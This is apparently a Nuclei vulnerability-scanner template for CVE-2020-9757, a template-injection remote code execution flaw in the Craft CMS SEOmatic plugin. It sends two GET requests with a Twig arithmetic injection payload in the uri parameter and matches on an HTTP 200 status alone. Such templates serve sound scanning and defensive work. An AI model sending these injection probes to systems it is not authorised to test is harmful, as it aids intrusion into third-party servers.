id: poc-yaml-craftcms-seomatic-cve-2020-9757-rce

info:
  name: poc-yaml-craftcms-seomatic-cve-2020-9757-rce
  author: x1n9Qi8
  severity: critical
  tags: xray-converted,rce,cve-2020-9757,ct-123566
  reference:
    - http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-202003-181
    - http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-9757

http:
  - raw:
      - |
        GET /actions/seomatic/meta-container/meta-link-container/?uri={{{{rand_int(1000, 9999)}}*'{{rand_int(1000, 9999)}}'}} HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
  - raw:
      - |
        GET /actions/seomatic/meta-container/all-meta-containers?uri={{{{rand_int(1000, 9999)}}*'{{rand_int(1000, 9999)}}'}} HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200